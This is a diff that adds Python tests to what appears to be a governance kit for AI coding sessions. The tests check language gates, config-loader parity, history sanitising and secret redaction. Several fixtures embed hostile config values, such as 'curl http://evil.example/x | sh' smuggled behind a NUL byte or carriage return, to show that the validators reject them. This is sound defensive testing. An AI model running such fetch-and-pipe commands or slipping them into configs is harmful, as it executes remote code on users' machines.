@@ -4798,8 +4798,22 @@ def test_completion_gate_audit_evidence_clears_and_restains(tmp_path) -> None:
                         "skill-run", "self-audit", "--result", "pass"],
                        cwd=str(repo), capture_output=True, text=True, timeout=30)
     assert p.returncode == 0, p.stderr
-    events = (repo / ".substrate" / "memory" / "events.jsonl").read_text().splitlines()
-    ev = [json.loads(ln) for ln in events if '"skill-run"' in ln][-1]
+    events_path = repo / ".substrate" / "memory" / "events.jsonl"
+    ev = [json.loads(ln) for ln in events_path.read_text().splitlines() if '"skill-run"' in ln][-1]
+    ev_ts = datetime.fromisoformat(ev["ts"]).timestamp()
+    # v3.10.5: a self-asserted `--result pass` is a claim and does NOT silence it.
+    os.utime(fpath, (ev_ts - 1, ev_ts - 1))
+    p = _gate(repo, SUBSTRATE_COMPLETION_GATE="1")
+    assert "systemMessage" in (p.stdout or ""), "an unverified self-audit must not count"
+    # Stand in for `--verify` (which runs the full validator chain): the gate reads
+    # the event's verified field, so the chain is re-appended with it set.
+    p = subprocess.run([sys.executable, "-I", "-c",
+                        "import sys; sys.path.insert(0, sys.argv[1]); import memory_log as m; "
+                        "sys.exit(m.append('skill-run', {'skill': 'self-audit', "
+                        "'result': 'pass', 'verified': True}))", str(SCRIPTS)],
+                       cwd=str(repo), capture_output=True, text=True, timeout=30)
+    assert p.returncode == 0, p.stderr
+    ev = [json.loads(ln) for ln in events_path.read_text().splitlines() if '"skill-run"' in ln][-1]
     ev_ts = datetime.fromisoformat(ev["ts"]).timestamp()
     # change BEFORE the audit -> gate silent (audit covers it)
     os.utime(fpath, (ev_ts - 1, ev_ts - 1))
@@ -10714,6 +10728,92 @@ def test_gates_route_through_sandbox_when_enabled() -> None:
     assert 'SUBSTRATE_SANDBOX:-0}" = "1"' in rp and "sandbox_exec.sh" in rp, "run_python_gate must route through sandbox"
 
 
+def _lang_gate_repo(tmp_path, lang: str, files: dict[str, str], sandbox_exit: int | None = None):
+    repo = tmp_path / "repo"
+    (repo / "scripts").mkdir(parents=True)
+    (repo / ".substrate").mkdir()
+    for name in ("lang_gate.sh", "_substrate_config.sh", "sandbox_exec.sh"):
+        _shutil.copy2(SCRIPTS / name, repo / "scripts" / name)
+    config = f'SUBSTRATE_LANG="{lang}"\n'
+    if sandbox_exit is not None:
+        # A sandbox that refuses to run (fail-closed exit) must fail the gate too.
+        (repo / "scripts" / "sandbox_exec.sh").write_text(
+            f"#!/usr/bin/env bash\nexit {sandbox_exit}\n", encoding="utf-8")
+        (repo / "scripts" / "sandbox_exec.sh").chmod(0o755)
+        config += 'SUBSTRATE_SANDBOX="1"\n'
+    (repo / ".substrate" / "config").write_text(config, encoding="utf-8")
+    for rel, text in files.items():
+        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
+        (repo / rel).write_text(text, encoding="utf-8")
+    return repo
+
+
+def _run_lang_gate(repo, gate: str):
+    env = {k: v for k, v in os.environ.items() if not k.startswith("SUBSTRATE_")}
+    env["GOFLAGS"] = "-mod=mod"
+    env.setdefault("GOCACHE", str(repo.parent / "gocache"))
+    return subprocess.run(["bash", "scripts/lang_gate.sh", gate], cwd=repo, env=env,
+                          capture_output=True, text=True, timeout=240)
+
+
+_GO_MOD = "module example.com/x\n\ngo 1.21\n"
+_GO_PASS = 'package x\n\nimport "testing"\n\nfunc TestX(t *testing.T) {}\n'
+_GO_FAIL = 'package x\n\nimport "testing"\n\nfunc TestX(t *testing.T) {\n\tt.Fatal("boom")\n}\n'
+
+
+@pytest.mark.parametrize("lang,files,gate,expect_rc,expect_skip", [
+    # A failing gate command fails the gate, with the command's own status.
+    ("node", {"package.json": '{"scripts":{"test":"exit 3"}}'}, "test", 3, False),
+    ("node", {"package.json": '{"scripts":{"lint":"exit 1"}}'}, "lint", 1, False),
+    ("node", {"package.json": '{"scripts":{"test":"exit 0"}}'}, "test", 0, False),
+    # Skips are only for a repo that has nothing for the gate.
+    ("node", {"package.json": '{"scripts":{"test":"exit 0"}}'}, "typecheck", 0, True),
+    ("node", {}, "test", 0, True),
+    # A package.json that cannot be read is not "no script".
+    ("node", {"package.json": '{"scripts":'}, "test", 1, False),
+    ("go", {"go.mod": _GO_MOD, "x_test.go": _GO_FAIL}, "test", 1, False),
+    ("go", {"go.mod": _GO_MOD, "x_test.go": _GO_PASS}, "test", 0, False),
+    # A package that does not compile is a failure, not "no go packages".
+    ("go", {"go.mod": _GO_MOD, "x.go": "package x\nfunc (\n"}, "typecheck", 1, False),
+    ("go", {"go.mod": _GO_MOD, "x.go": "package x\nfunc (\n"}, "test", 1, False),
+    ("go", {"go.mod": _GO_MOD, "x.go": "package x\nfunc (\n"}, "lint", 1, False),
+    ("go", {"go.mod": _GO_MOD, "x.go": "package x\nfunc  F() {}\n"}, "lint", 1, False),
+    # testdata/ is not built by go, so invalid Go there is not a lint failure.
+    ("go", {"go.mod": _GO_MOD, "x.go": "package x\n", "testdata/bad.go": "package y\nfunc (\n"},
+     "lint", 0, False),
+    ("go", {"go.mod": _GO_MOD}, "test", 0, True),
+    ("none", {}, "test", 0, True),
+])
+def test_lang_gate_failure_is_never_a_skip(tmp_path, lang, files, gate, expect_rc, expect_skip) -> None:
+    """v3.10.5: `probe && run || skip` read a failing `npm test`, `go vet` or `go test`
+    as "skipped" with exit 0, and a Go package that did not compile as "no go
+    packages", so a consumer's node or go gate could never fail."""
+    tool = {"node": "node", "go": "go"}.get(lang)
+    if tool and not _shutil.which(tool):
+        pytest.skip(f"{tool} not installed")
+    r = _run_lang_gate(_lang_gate_repo(tmp_path, lang, files), gate)
+    out = r.stdout + r.stderr
+    assert r.returncode == expect_rc, out
+    assert ("skipped" in out) == expect_skip, out
+
+
+def test_lang_gate_sandbox_refusal_fails_the_gate(tmp_path) -> None:
+    """The sandbox fails closed (exit 3) when a required backend is missing; the gate
+    must report that failure, not turn it into a skip."""
+    if not _shutil.which("node"):
+        pytest.skip("node not installed")
+    repo = _lang_gate_repo(tmp_path, "node", {"package.json": '{"scripts":{"test":"exit 0"}}'},
+                           sandbox_exit=3)
+    r = _run_lang_gate(repo, "test")
+    assert r.returncode == 3, r.stdout + r.stderr
+    assert "skipped" not in r.stdout + r.stderr
+
+
+def test_lang_gate_rejects_an_unknown_gate(tmp_path) -> None:
+    r = _run_lang_gate(_lang_gate_repo(tmp_path, "node", {}), "tset")
+    assert r.returncode == 2 and "unknown gate" in r.stderr
+
+
 def test_sandbox_exec_error_reports_real_rc(tmp_path) -> None:
     """v3.5.1-audit P2: the refuse message must report the resolver's REAL rc
     (2=invalid policy), not 0 (the exit status of `!` in an `if ! cmd` block)."""
@@ -13548,15 +13648,72 @@ def test_canonical_profile_parser_agrees_with_the_shell_loader(tmp_path, config)
         ["bash", "-c",
          '. scripts/_substrate_config.sh && load_substrate_config && printf "%s" "$SUBSTRATE_PROFILE"'],
         cwd=str(td), capture_output=True, text=True, timeout=60)
-    if shell.returncode != 0:
-        pytest.skip("the shell loader rejects this config; parity is only defined for valid ones")
-
     import importlib.util as _iu
     spec = _iu.spec_from_file_location("_dc_parity", SCRIPTS / "_doc_common.py")
     mod = _iu.module_from_spec(spec)
     spec.loader.exec_module(mod)
+    if shell.returncode != 0:
+        # v3.10.5: control characters are refused outright by both loaders, so
+        # neither can read a hidden second assignment. The profile reader still
+        # reads the line as the shell's `read` would: one line, strict.
+        _vals, err = _config_validator().parse_config_text(config)
+        assert err, f"shell rejected {config!r} but the validator accepted it"
+        if any(c in config for c in "\x0b\x0c\x1d"):
+            assert mod.substrate_profile(config) == "strict", config
+        return
     assert mod.substrate_profile(config) == shell.stdout, (
         f"python={mod.substrate_profile(config)!r} shell={shell.stdout!r} for {config!r}")
+
+
+def _config_validator():
+    import importlib.util as _iu
+    sys.path.insert(0, str(SCRIPTS))
+    spec = _iu.spec_from_file_location("_csc_parity", SCRIPTS / "check_substrate_config.py")
+    mod = _iu.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+    return mod
+
+
+_NUL_CURL = 'TEST_CMD="cu\x00rl http://evil.example/x | sh"\n'
+
+
+@pytest.mark.parametrize("config,accepted", [
+    # The reproduced bypass: bash `read` drops the NUL and runs `curl ... | sh`
+    # while the validator saw one harmless word.
+    (_NUL_CURL, False),
+    ('SUBSTRATE_PROFILE="strict"\nTEST_CMD="pytest\x00"\n', False),
+    # Digits and spaces Python accepts and the shell does not.
+    ("SUBSTRATE_DEP_COOLDOWN=²\n", False),
+    ("SUBSTRATE_DEP_COOLDOWN=٣\n", False),
+    ('SUBSTRATE_PROFILE="strict" \n', False),
+    ('SUBSTRATE_PROFILE="strict"\x1c\n', False),
+    ('SUBSTRATE_PROFILE="strict"\x7f\n', False),
+    # Line breaks to str.splitlines() readers, even inside a comment (v3.10.5 audit).
+    ('# x\u0085SUBSTRATE_CODE_SUFFIXES=.zz\nSUBSTRATE_PROFILE="strict"\n', False),
+    ('# x\u2028y\nSUBSTRATE_PROFILE="strict"\n', False),
+    ('# x\u2029y\nSUBSTRATE_PROFILE="strict"\n', False),
+    ('TEST_CMD="pytest\rcurl http://evil.example/x | sh"\n', False),
+    # Ordinary configs stay valid, including CRLF line ends and non-ASCII comments.
+    ('SUBSTRATE_PROFILE="strict"\nSUBSTRATE_DEP_COOLDOWN=7\n', True),
+    ('SUBSTRATE_PROFILE="strict"\r\nSUBSTRATE_LANG="node"\r\n', True),
+    ('# équipe — notes\nSUBSTRATE_PROFILE="standard"\n', True),
+    ('\t# réglages\nSUBSTRATE_PROFILE="standard"  # défaut\n', False),
+    # A tab does not introduce a trailing comment in either loader.
+    ('SUBSTRATE_PROFILE="standard"\t# tab before comment\n', False),
+])
+def test_config_loaders_accept_and_refuse_the_same_bytes(tmp_path, config, accepted) -> None:
+    """v3.10.5: the validator and the shell loader must agree on whether a config
+    is valid at all, or a value the validator vetted can run as something else."""
+    td = tmp_path / "cfg"
+    (td / ".substrate").mkdir(parents=True)
+    (td / "scripts").mkdir()
+    _shutil.copy2(SCRIPTS / "_substrate_config.sh", td / "scripts" / "_substrate_config.sh")
+    (td / ".substrate" / "config").write_bytes(config.encode("utf-8"))
+    shell = subprocess.run(["bash", "-c", ". scripts/_substrate_config.sh && load_substrate_config"],
+                           cwd=str(td), capture_output=True, text=True, timeout=60)
+    _vals, err = _config_validator().parse_config_text(config)
+    assert (shell.returncode == 0) == accepted, (config, shell.stderr)
+    assert (err is None) == accepted, (config, err)
 
 
 # Modules that legitimately mention SUBSTRATE_PROFILE without READING a profile
@@ -13800,7 +13957,11 @@ def _record_repo(tmp_path):
     # record_in_chain pins the root it was given.
     decoy = tmp_path / "decoy"
     (decoy / ".substrate" / "memory").mkdir(parents=True)
-    env = {k: v for k, v in os.environ.items() if k != "SUBSTRATE_PROJECT_DIR"}
+    # GITHUB_* and SUBSTRATE_HISTORY_BASE choose check_history_sha's base branch: the
+    # fixture never inherits them, so the suite behaves the same under Actions.
+    env = {k: v for k, v in os.environ.items()
+           if k not in ("SUBSTRATE_PROJECT_DIR", "SUBSTRATE_HISTORY_BASE")
+           and not k.startswith("GITHUB_")}
     env["CLAUDE_PROJECT_DIR"] = str(decoy)
 
     def run(script, *a):
@@ -14966,6 +15127,12 @@ def test_audit_pytest_limit_is_configurable_and_fails_closed(monkeypatch, capsys
     assert audit.PYTEST_TIMEOUT_DEFAULT > audit.QUICK_TIMEOUT
     monkeypatch.setenv(audit.PYTEST_TIMEOUT_ENV, "900")
     assert audit.pytest_timeout() == 900
+    # Both ends of the documented range are accepted (lens finding: `<` for `<=`
+    # survived every test).
+    lo, hi = audit.PYTEST_TIMEOUT_RANGE
+    for edge in (lo, hi):
+        monkeypatch.setenv(audit.PYTEST_TIMEOUT_ENV, str(edge))
+        assert audit.pytest_timeout() == edge
     for bad in ("abc", "59", "1801", "3600", "12.5", "-5","١٢٠٠"):
         monkeypatch.setenv(audit.PYTEST_TIMEOUT_ENV, bad)
         with pytest.raises(ValueError, match="whole seconds"):
@@ -15053,6 +15220,9 @@ def test_history_sanitizer_keeps_tool_names_inside_identifiers(text) -> None:
     summaries and commit subjects vanished from the session-start context."""
     handoff = _handoff_module()
     assert handoff._safe_history_line(text, 400) == text
+    # Production clips a summary to 130 characters BEFORE the scan.
+    assert not handoff._was_stripped(
+        handoff._safe_history_line(text, handoff._HISTORY_SUMMARY_CHARS))
 
 
 @pytest.mark.parametrize("text", [
@@ -15112,3 +15282,114 @@ def test_audit_output_is_redacted_before_it_is_printed_or_stored(
     assert fake not in capsys.readouterr().out
     stored = "".join(p.read_text() for p in (tmp_path / "ai" / "audits").rglob("audit-report.*"))
     assert stored and fake not in stored and "[REDACTED-SECRET]" in stored
+
+
+# Real entries the filter withholds at session start, from before append_history
+# refused such lines (v3.10.5). Entries are never edited, so this list only
+# shrinks if the filter gets more precise; a NEW withheld line fails the test.
+_KNOWN_WITHHELD_HISTORY = {("knowledge", "222076c"), ("knowledge", "c0937af"),
+                           ("knowledge", "e353d75")}
+
+
+def test_real_history_lines_reach_session_start():
+    """Every summary and Knowledge lead in the kit's own HISTORY, at the caps and
+    with the parser production uses (lens finding: tests used cap 400 on a
+    synthetic string while session start uses 130 on the real file)."""
+    if not (ROOT / "VERSION").is_file():
+        pytest.skip("kit source HISTORY only")
+    handoff = _handoff_module()
+    raw = (ROOT / "docs" / "HISTORY.md").read_text(encoding="utf-8")
+    withheld = set()
+    for hdr, summ, know in handoff._history_entries(raw):
+        m = handoff._SHA_IN_HEADER.search(hdr)
+        sha = m.group(1)[:7] if m else hdr
+        if summ and handoff._was_stripped(
+                handoff._safe_history_line(summ, handoff._HISTORY_SUMMARY_CHARS)):
+            withheld.add(("summary", sha))
+        if know:
+            lead = handoff._SENTENCE_END.split(" ".join(know.split()), maxsplit=1)[0]
+            if handoff._was_stripped(
+                    handoff._safe_history_line(lead, handoff._KNOWLEDGE_SENTENCE_CHARS)):
+                withheld.add(("knowledge", sha))
+    assert withheld <= _KNOWN_WITHHELD_HISTORY, sorted(withheld - _KNOWN_WITHHELD_HISTORY)
+
+
+@pytest.mark.parametrize("text,words", [
+    ("a <!-- hidden --> b", ["a", "b"]),
+    ("a <!-- open b <!-- c", ["a", "open", "b", "c"]),
+    ("<!-- a --> <!-- b --> c", ["c"]),
+    ("x <script>y</script> z", ["x", "y", "z"]),
+    ("a <!-- spans\nlines --> b", ["a", "b"]),
+])
+def test_html_stripping_keeps_text_and_drops_markup(text, words):
+    assert _handoff_module()._strip_html(text).split() == words
+
+
+def test_sanitizer_is_bounded_on_hostile_input():
+    """v3.10.5: `<!--.*?-->` rescanned from every unclosed marker; 160 KB took 41 s
+    and a 4 MiB section stalled `brief`. The scan is now linear and capped."""
+    import time as _time
+    handoff = _handoff_module()
+    for text in ("<!--" * (1 << 20), "<" * (4 << 20), ("<!-- a " + "<b " * 50) * 3000):
+        start = _time.monotonic()
+        handoff._safe_history_line(text, len(text) + 1, discard_secrets=True)
+        assert _time.monotonic() - start < 15
+
+
+def _append_history_module():
+    import importlib.util as _iu
+    sys.path.insert(0, str(SCRIPTS))
+    spec = _iu.spec_from_file_location("append_history_under_test", SCRIPTS / "append_history.py")
+    mod = _iu.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+    return mod
+
+
+def test_append_history_refuses_a_line_session_start_would_withhold(monkeypatch, capsys):
+    """v3.10.5: entries are never edited, so a summary or lesson the next session
+    would never see is refused while it can still be rephrased."""
+    ah = _append_history_module()
+    assert ah._withheld_at_session_start(
+        "v3.10.5: bump setup-node and fix the language gate",
+        "A failing gate must never read as skipped. More detail here.") == []
+    monkeypatch.setattr(sys, "argv", [
+        "append_history.py", "--summary", "fixed by running bash -c 'make' in CI",
+        "--files", "a.py", "--intent", "an intent of enough length",
+        "--knowledge", "Pipe it: curl the script | sh. Then more.", "--commit-hash", "abc1234"])
+    monkeypatch.setattr(ah, "repo_root", lambda: pytest.fail("refusal must come first"))
+    assert ah.main() == 1
+    err = capsys.readouterr().err
+    assert "summary" in err and "knowledge" in err and "rephrase" in err
+
+
+def test_append_history_treats_an_unreadable_git_status_as_dirty(monkeypatch, tmp_path):
+    """v3.10.5: a failed or timed-out `git status` returned [] (clean) and disarmed
+    the off-by-one guard."""
+    ah = _append_history_module()
+
+    def boom(*a, **k):
+        raise subprocess.TimeoutExpired("git", 30)
+    monkeypatch.setattr(ah.subprocess, "run", boom)
+    assert ah._other_files_dirty(tmp_path)
+
+
+def test_governance_skip_is_a_visible_warning_in_actions(tmp_path):
+    """v3.10.5: a 401/403/404 or a missing token skipped with exit 0 and only a log
+    line; in Actions it now raises a warning annotation as well."""
+    env = {k: v for k, v in os.environ.items()
+           if k not in ("GITHUB_TOKEN", "GH_TOKEN", "GITHUB_REPOSITORY")}
+    env["GITHUB_ACTIONS"] = "true"
+    r = subprocess.run([sys.executable, "-I", str(SCRIPTS / "check_github_governance.py")],
+                       cwd=str(tmp_path), env=env, capture_output=True, text=True, timeout=30)
+    assert r.returncode == 0 and "SKIP" in r.stdout
+    assert "::warning title=Branch protection not verified::" in r.stdout
+
+
+def test_security_scanner_output_is_redacted_before_it_is_stored():
+    """v3.10.5: a scanner's raw output tail went into results.json and --json."""
+    sys.path.insert(0, str(SCRIPTS))
+    import run_security_scanners as rss
+    fake = "AKIA" + "QX7" * 5 + "Z"
+    tail = rss._redact_tail("x" * 5000 + f" leaked {fake} here")
+    assert fake not in tail and len(tail) <= 2000
+
